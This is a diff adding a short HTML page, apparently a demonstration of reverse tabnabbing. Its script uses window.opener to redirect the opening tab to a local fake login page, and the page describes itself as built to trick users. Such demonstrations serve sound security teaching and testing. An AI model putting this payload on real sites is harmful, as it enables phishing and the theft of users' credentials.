@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Malicious Page</h1>
+    <p>This page is designed to trick users into thinking it's a legitimate site.</p>
+    <script>
+        window.opener.location.href = "./fake_login.html";
+    </script>
+</body>
+</html>
